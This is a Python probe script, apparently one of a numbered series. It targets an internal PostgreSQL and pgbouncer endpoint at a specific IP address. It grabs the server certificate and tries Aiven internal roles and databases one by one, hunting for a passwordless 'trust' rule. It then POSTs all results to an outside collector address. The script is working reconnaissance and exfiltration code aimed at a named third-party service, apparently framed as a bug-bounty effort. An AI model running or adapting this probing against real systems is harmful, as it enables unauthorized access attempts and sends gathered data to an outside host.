#!/usr/bin/env python3
"""probe23 - internal endpoint, round two: certificate DER (for SANs) + pooler-specific auth surface.

probe22 showed 129.213.46.149:12691 and :12692 both challenge MD5 for every user tried, with a
certificate that differs from the public frontend's. Two things remain:

 1. the certificate's SANs - the container image has no `cryptography`, so ship the raw DER back for
    parsing on our side;
 2. the pooler port (12692) with the users/databases we did NOT try: the Aiven internal roles
    (`_aiven`, `_avnadmin_monitor`), the pooler's own admin database (`pgbouncer`), and `_aiven` as a
    database name. A pooler is a separate auth surface from the Postgres behind it and is the likeliest
    place for a trust rule.

No passwords are submitted; every call stops at the first auth request.
"""
from __future__ import annotations

import base64
import hashlib
import json
import socket
import ssl
import struct
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer

COLLECTOR = "http://208.87.134.252:9200/rt23"
TARGET = "129.213.46.149"
USERS = ["_aiven", "_avnadmin_monitor", "avnadmin", "pgbouncer", "postgres", "ctf"]
DBS = ["pgbouncer", "_aiven", "defaultdb"]
RESULTS = {"stage": "init", "certs": {}, "auth": {}, "negotiation": {}}


class H(BaseHTTPRequestHandler):
    def do_GET(self):
        body = json.dumps(RESULTS).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *a):
        pass


def der_b64(port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((TARGET, port))
        s.sendall(struct.pack("!ii", 8, 80877103))
        if s.recv(1) != b"S":
            return "no-tls"
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        t = ctx.wrap_socket(s, server_hostname=TARGET)
        der = t.getpeercert(binary_form=True)
        t.close()
        return {"sha256_16": hashlib.sha256(der).hexdigest()[:16],
                "der_b64": base64.b64encode(der).decode(), "len": len(der)}
    except Exception as e:                                              # noqa: BLE001
        return "ERR %s" % type(e).__name__


def startup(port, user, db, minor=196610):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(8)
        s.connect((TARGET, port))
        s.sendall(struct.pack("!ii", 8, 80877103))
        if s.recv(1) != b"S":
            return "ssl-refused"
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=TARGET)
        body = struct.pack("!i", minor)
        for k, v in (("user", user), ("database", db), ("application_name", "aiven-bugbounty/1.0")):
            body += k.encode() + b"\x00" + v.encode() + b"\x00"
        body += b"\x00"
        s.sendall(struct.pack("!i", len(body) + 4) + body)
        msgs = []
        deadline = time.time() + 8
        while time.time() < deadline:
            h = s.recv(5)
            if len(h) < 5:
                return " | ".join(msgs + ["closed"])
            n = struct.unpack("!i", h[1:5])[0]
            p = b""
            while len(p) < n - 4:
                c = s.recv(n - 4 - len(p))
                if not c:
                    break
                p += c
            if h[:1] == b"R":
                code = struct.unpack("!i", p[:4])[0]
                return " | ".join(msgs + [{0: "TRUST(none required)", 3: "CLEARTEXT", 5: "MD5", 10: "SCRAM", 7: "GSS"}.get(code, "code=%d" % code)])
            if h[:1] == b"E":
                m = p.split(b"M", 1)[1].split(b"\x00", 1)[0].decode("latin1") if b"M" in p else "?"
                return " | ".join(msgs + ["FATAL: %s" % m[:70]])
            if h[:1] == b"v":
                # NegotiateProtocolVersion: payload is int32 newest minor, int32 count, then names
                try:
                    newest = struct.unpack("!i", p[:4])[0]
                    msgs.append("negotiated_newest=%d" % newest)
                except Exception:
                    msgs.append("negotiate")
                continue
            if h[:1] == b"Z":
                return " | ".join(msgs + ["ReadyForQuery"])
        return " | ".join(msgs + ["no message"])
    except Exception as e:                                              # noqa: BLE001
        return "ERR %s" % type(e).__name__


threading.Thread(target=lambda: HTTPServer(("0.0.0.0", 8080), H).serve_forever(), daemon=True).start()
time.sleep(2)

RESULTS["certs"]["12691"] = der_b64(12691)
RESULTS["certs"]["12692"] = der_b64(12692)
for port in (12691, 12692):
    for u in USERS:
        for db in DBS:
            RESULTS["auth"]["%d/%s@%s" % (port, u, db)] = startup(port, u, db)
for port in (12691, 12692):
    RESULTS["negotiation"][str(port)] = startup(port, "avnadmin", "defaultdb", minor=196611)  # proto 3.3

RESULTS["stage"] = "done"
RESULTS["finished"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
try:
    import urllib.request
    urllib.request.urlopen(urllib.request.Request(COLLECTOR, data=json.dumps(RESULTS).encode(),
                                                  headers={"Content-Type": "application/json"}), timeout=25)
except Exception as e:                                                  # noqa: BLE001
    print("collector post failed:", e)
print("posted")
while True:
    time.sleep(60)
